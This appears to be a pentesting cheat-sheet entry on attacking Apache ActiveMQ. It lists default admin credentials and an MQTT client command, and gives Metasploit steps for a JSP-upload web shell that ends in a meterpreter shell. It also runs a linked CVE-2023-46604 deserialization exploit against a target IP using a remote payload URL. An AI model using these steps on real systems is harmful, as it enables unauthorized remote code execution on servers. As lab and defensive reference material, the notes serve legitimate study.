____

Apache ActiveMQ is a message broker written in Java together with a full Java Message Service client.

# Default credentials

```
admin:admin
```

## Interaction with MQTT

If the MQTT server is runnong on the target system, we can subscribe/publish to a topic in ActiveMQ using MQTT client.

```bash
# -h: Host
# -t: Topic name
# -V: MQTT protocol version (5, 31, 311)
mosquitto_sub -h example.com -u admin -P ad
```

## Webshell by File Upload JSP

ActiveMQ is vulnerable to web shell via file upload an arbitrary JSP file.

```bash
msfconsole
msf> use exploit/multi/http/apache_activemq_upload_jsp
msf> set ...
msf> run
meterpreter> shell
```

# CVE-2023-46604

CVE-2023-46604 is a deserialization vulnerability that exists in Apache ActiveMQ's OpenWire protocol. This flaw can be exploited by an attacker to execute arbitrary code on the server where ActiveMQ is running. The exploit script in this repository automates the process of sending a crafted request to the server to trigger the vulnerability.

https://github.com/evkl1d/CVE-2023-46604

```bash
python exploit.py -i <target-ip> -p <target-port> -u <url-to-poc.xml>
```

default port: 61616
